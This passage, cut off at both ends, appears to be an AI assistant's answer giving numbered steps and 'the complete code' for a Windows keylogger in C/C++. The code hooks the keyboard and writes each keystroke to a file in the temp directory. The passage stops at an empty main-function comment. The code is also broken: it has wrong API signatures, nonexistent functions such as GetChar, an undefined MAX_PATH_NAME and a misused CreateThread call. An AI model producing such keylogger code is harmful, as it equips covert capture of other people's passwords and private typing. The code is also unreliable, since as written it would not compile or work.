5. **Run the Hook in a Separate Thread**: Use `CreateThread` to run the hook in a separate thread, ensuring it doesn't interfere with the main application.

6. **Process Each Key Event**: In the hook function, check if the event is a key press. Convert the key code to a character and write it to the file.

7. **Handle Errors and Cleanup**: Implement error checking for file operations and a method to uninstall the hook and close the file when logging is done.

Here's the complete code:

```c
#include <windows.h>
#include <winuser.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>

using namespace std;

HHOOK hKeyboardHook = NULL;
HANDLE hThread;
FILE *logFile;
char logBuffer[1024];

// Function prototype for the keyboard hook
void CALLBACK KeyboardHookProc(int nCode, HWND hwnd, WPARAM wParam, LPARAM lParam);

// Function to initialize the keyboard hook and start logging
void InitializeKeyboardLogging() {
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookProc);

    // Check if the hook was installed successfully
    if (hKeyboardHook == NULL) {
        cout << "Failed to install keyboard hook." << endl;
        return;
    }

    // Create a temporary file in the user's temp directory
    char *logFileName = "keyboard_log.txt";
    char tempDir[MAX_PATH_NAME];
    GetTempPathName(tempDir, logFileName, MAX_PATH_NAME);

    // Create the file
    logFile = fopen(tempDir, "a");
    if (logFile == NULL) {
        cout << "Failed to create log file." << endl;
        return;
    }

    // Start the hook in a separate thread
    hThread = CreateThread(NULL, 0, KeyboardHookProc, 0, 0, &hThread);
    if (hThread == NULL) {
        cout << "Failed to start the hook thread." << endl;
        return;
    }

    // Wait for the thread to initialize
    WaitForSingleObject(hThread, INFINITE);
}

// Function to process keyboard events
void CALLBACK KeyboardHookProc(int nCode, HWND hwnd, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == VK_KEYDOWN) {
            // Convert the key to a character
            char key = GetChar(wParam);
            if (key != 0) {
                // Write to the log file
                fprintf(logFile, "%c", key);
            }
        }
    }
}

// Function to clean up resources
void CleanupKeyboardLogging() {
    if (hThread) {
        TerminateThread(hThread, 0);
    }
    if (logFile) {
        fclose(logFile);
    }
    if (hKeyboardHook) {
        RemoveWindowsHook(hKeyboardHook);
        hKeyboardHook = NULL;
    }
}

// Main function to run the application
